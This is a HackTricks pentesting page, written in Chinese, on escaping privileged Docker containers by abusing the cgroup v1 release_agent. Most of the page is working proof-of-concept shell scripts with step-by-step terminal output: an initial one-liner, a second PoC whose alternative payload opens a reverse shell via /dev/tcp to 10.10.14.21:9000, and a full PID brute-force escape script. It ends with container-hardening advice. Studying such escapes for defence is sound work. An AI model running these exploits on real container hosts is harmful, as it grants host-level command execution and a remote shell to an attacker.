<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


# `--privileged`标志

{% code title="初始PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% code title="第二个 PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.10.14.21/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

`--privileged`标志引入了重大的安全问题，并且该漏洞利用依赖于启用了该标志的docker容器的启动。使用此标志时，容器可以完全访问所有设备，并且没有seccomp、AppArmor和Linux capabilities的限制。

实际上，`--privileged`提供的权限远远超出了通过此方法逃离docker容器所需的权限。实际上，“只有”以下要求：

1. 我们必须在容器内作为root用户运行
2. 容器必须使用`SYS_ADMIN` Linux capability运行
3. 容器必须缺少AppArmor配置文件，或者允许`mount`系统调用
4. cgroup v1虚拟文件系统必须在容器内以读写方式挂载

`SYS_ADMIN` capability允许容器执行mount系统调用（参见[man 7 capabilities](https://linux.die.net/man/7/capabilities)）。[Docker默认使用受限的capabilities集合启动容器](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities)，并且不启用`SYS_ADMIN` capability，因为这样做存在安全风险。

此外，Docker默认使用`docker-default` AppArmor策略启动容器，即使容器使用`SYS_ADMIN`运行，也[禁止使用mount系统调用](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35)。

如果使用以下标志运行容器，则容器将容易受到此技术的攻击：`--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`

## 分解概念验证

现在我们了解了使用此技术的要求，并且已经完善了概念验证漏洞，让我们逐行解释它，以演示其工作原理。

要触发此漏洞利用，我们需要一个cgroup，我们可以在其中创建一个`release_agent`文件，并通过杀死cgroup中的所有进程来触发`release_agent`的调用。实现这一目标的最简单方法是挂载一个cgroup控制器并创建一个子cgroup。

为此，我们创建一个`/tmp/cgrp`目录，挂载[RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup控制器，并创建一个子cgroup（在本示例中命名为“x”）。虽然并未测试每个cgroup控制器，但这种技术应该适用于大多数cgroup控制器。

如果您正在跟随操作，并且出现“mount: /tmp/cgrp: special device cgroup does not exist”错误，那是因为您的设置没有RDMA cgroup控制器。将`rdma`更改为`memory`即可修复。我们使用RDMA是因为原始概念验证仅设计用于与其一起使用。

请注意，cgroup控制器是全局资源，可以多次挂载，具有不同的权限，并且在一个挂载中进行的更改将应用于另一个挂载。

我们可以在下面看到“x”子cgroup的创建和其目录列表。
```text
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
接下来，我们通过向其`notify_on_release`文件写入1来在释放“x” cgroup时启用cgroup通知。我们还通过将主机上的`release_agent`文件写入`/cmd`脚本的路径来设置RDMA cgroup的释放代理，稍后我们将在容器中创建该脚本。为此，我们将从`/etc/mtab`文件中获取容器在主机上的路径。

我们在容器中添加或修改的文件存在于主机上，并且可以从两个世界（容器中的路径和主机上的路径）修改它们。

下面是这些操作的示例：
```text
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
请注意我们将在主机上创建的 `/cmd` 脚本的路径：
```text
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
现在，我们创建 `/cmd` 脚本，使其执行 `ps aux` 命令，并将其输出保存到容器中的 `/output`，通过指定主机上输出文件的完整路径。最后，我们还打印 `/cmd` 脚本以查看其内容：
```text
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
最后，我们可以通过在“x”子cgroup目录中创建一个/bin/sh进程并将其PID写入cgroup.procs文件，来执行攻击。在/bin/sh退出后，主机上的脚本将被执行。然后，将在主机上执行的`ps aux`命令的输出保存到容器内的/output文件中：
```text
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# `--privileged`标志 v2

之前的 PoC 在容器配置了一个存储驱动程序时运行良好，该驱动程序公开了挂载点的完整主机路径，例如 `overlayfs`，然而最近我遇到了一些配置，这些配置并没有明显地披露主机文件系统的挂载点。

## Kata Containers
```text
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io/)默认情况下通过`9pfs`挂载容器的根文件系统。这不会泄露有关Kata Containers虚拟机中容器文件系统位置的任何信息。

\* 关于Kata Containers的更多信息将在未来的博客文章中提供。

## 设备映射器
```text
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
我在一个实时环境中看到了一个具有根挂载的容器，我相信该容器是使用特定的`devicemapper`存储驱动程序配置运行的，但是到目前为止，我无法在测试环境中复制这种行为。

## 另一种 PoC

显然，在这些情况下，没有足够的信息来确定容器文件在主机文件系统上的路径，因此无法直接使用 Felix 的 PoC。然而，我们仍然可以通过一些巧妙的方法执行这种攻击。

唯一需要的关键信息是相对于容器主机的完整路径，用于在容器内执行的文件。如果无法从容器内的挂载点中确定这一点，我们必须寻找其他地方。

### `/proc` 挽救 <a id="proc-to-the-rescue"></a>

Linux 的 `/proc` 伪文件系统公开了系统上运行的所有进程的内核进程数据结构，包括在不同命名空间中运行的进程，例如容器内部的进程。可以通过在容器中运行命令并访问主机上的进程的 `/proc` 目录来证明这一点：
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
_顺便说一下，`/proc/<pid>/root` 数据结构曾经让我困惑了很长时间，我一直无法理解为什么将符号链接指向 `/` 是有用的，直到我在 man 手册中读到了实际的定义：_

> /proc/\[pid\]/root
>
> UNIX 和 Linux 支持每个进程的文件系统根目录的概念，通过 chroot\(2\) 系统调用进行设置。这个文件是一个符号链接，指向进程的根目录，并且与 exe 和 fd/\* 的行为相同。
>
> 但请注意，这个文件不仅仅是一个符号链接。它提供了与进程本身相同的文件系统视图（包括命名空间和每个进程的挂载点集）。

`/proc/<pid>/root` 符号链接可以用作容器内任何文件的主机相对路径：Container
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
这将攻击的要求从需要知道容器内文件相对于容器主机的完整路径，变为需要知道容器中任意进程的进程ID。

### 进程ID猜测 <a id="pid-bashing"></a>

这实际上是比较容易的部分，Linux中的进程ID是数字，并且按顺序分配。`init`进程被分配进程ID `1`，随后的进程被分配递增的ID。为了确定容器内进程的主机进程ID，可以使用暴力递增搜索的方法：Container
```text
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
主机
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### 将所有内容整合在一起 <a id="putting-it-all-together"></a>

为了完成这次攻击，可以使用暴力破解技术来猜测路径`/proc/<pid>/root/payload.sh`的pid，每次迭代将猜测的pid路径写入cgroups的`release_agent`文件，触发`release_agent`，并查看是否创建了输出文件。

这种技术的唯一注意事项是它绝对不是一个隐蔽的方法，并且可能会使pid计数非常高。由于没有长时间运行的进程保持运行，这 _应该_ 不会导致可靠性问题，但请不要引用我。

下面的PoC实现了这些技术，提供了一个比Felix原始PoC中使用cgroups `release_agent`功能逃逸特权容器更通用的攻击方法：
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
在特权容器中执行PoC应该会提供类似的输出：
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# 安全使用容器

Docker默认限制和限制容器。放宽这些限制可能会导致安全问题，即使没有完全使用`--privileged`标志的权限。重要的是要认识到每个附加权限的影响，并将权限总体限制在最低限度。

为了保持容器的安全性：

* 不要使用`--privileged`标志或在容器内挂载[Docker套接字](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/)。Docker套接字允许生成容器，因此通过使用`--privileged`标志运行另一个容器是控制主机的简单方法。
* 不要在容器内以root身份运行。使用[不同的用户](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user)或[用户命名空间](https://docs.docker.com/engine/security/userns-remap/)。容器中的root与主机上的root相同，除非使用用户命名空间重新映射。它仅受到轻微的限制，主要是通过Linux命名空间、能力和cgroups。
* [丢弃所有能力](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities)（`--cap-drop=all`），仅启用所需的能力（`--cap-add=...`）。许多工作负载不需要任何能力，添加能力会增加潜在攻击的范围。
* [使用“no-new-privileges”安全选项](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/)防止进程通过suid二进制文件获得更多权限。
* [限制容器可用的资源](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources)。资源限制可以保护机器免受拒绝服务攻击。
* 调整[seccomp](https://docs.docker.com/engine/security/seccomp/)、[AppArmor](https://docs.docker.com/engine/security/apparmor/)（或SELinux）配置文件，将容器可用的操作和系统调用限制为最低限度。
* 使用[官方的Docker镜像](https://docs.docker.com/docker-hub/official_images/)或基于它们构建自己的镜像。不要继承或使用[带后门的](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/)镜像。
* 定期重建镜像以应用安全补丁。这是不言而喻的。

# 参考资料

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/_fel1x/status/1151487051986087936)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧。**

</details>
